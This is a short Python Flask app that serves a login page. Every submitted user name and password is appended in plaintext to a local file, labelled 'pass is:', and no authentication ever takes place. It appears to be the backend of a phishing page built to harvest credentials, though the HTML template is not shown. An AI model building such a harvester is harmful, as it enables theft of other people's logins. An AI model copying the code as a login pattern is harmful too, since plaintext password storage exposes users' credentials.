from flask import Flask, render_template, request

app = Flask(__name__, template_folder="template")


@app.route('/', methods=["POST", "GET"])
def loginAndSave():
    if request.method=="POST":
        userName=request.form["userName"]
        password=request.form["password"]
        f=open("data.txt","a")
        f.write(userName)
        f.write("   pass is:")
        f.write(password)
        f.write("\n")
    return render_template("login.html")
        

if __name__ == '__main__':
  app.run(host='0.0.0.0', port=5000)
